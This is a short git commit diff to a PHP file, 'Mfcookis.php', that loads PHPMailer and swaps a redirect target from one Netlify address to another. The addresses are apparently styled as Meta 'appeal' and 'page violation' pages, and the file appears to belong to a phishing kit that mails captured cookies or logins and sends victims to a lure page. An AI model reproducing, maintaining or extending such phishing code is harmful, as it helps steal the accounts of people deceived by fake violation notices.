bd8cf08d175ff3f2a348c1eae1482edc152c27cd
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 15:18:42 +0500

    Update Mfcookis.php

--- Mfcookis.php
+++ Mfcookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://immediately-appeal-isuuse.netlify.app/");
+header("Location: https://page-team-violation-un.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
